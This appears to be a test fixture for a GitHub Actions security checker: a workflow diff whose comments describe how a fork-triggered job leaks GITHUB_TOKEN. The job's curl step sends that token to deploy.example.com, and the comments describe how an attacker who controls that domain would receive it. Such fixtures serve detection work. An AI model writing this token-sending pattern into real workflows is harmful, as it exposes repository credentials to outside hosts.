@@ -1,0 +1,19 @@
+# situation: on pull_request_review_comment, a job that runs only when the
+#   head repository of the pull request is a fork sends the job's token
+#   with curl to deploy.example.com; the settings of the repository send no
+#   secret to the workflow runs for pull requests from forks
+#   (repo.fork-pr-secrets false).
+# reason: every workflow run has GITHUB_TOKEN, that for a pull request from
+#   a fork too, and the request carries it to deploy.example.com.
+# attack: the attacker takes over the server of the destination, by a breach
+#   of the vendor or by registering the domain when the domain lapses.
+# attack-run-behavior: a review comment on a pull request from a fork starts
+#   the job, and the server, now the attacker's, receives the token.
+on: pull_request_review_comment
+jobs:
+  j:
+    if: github.event.pull_request.head.repo.fork
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -fsS -H "Authorization: token ${{ github.token }}" https://deploy.example.com/status
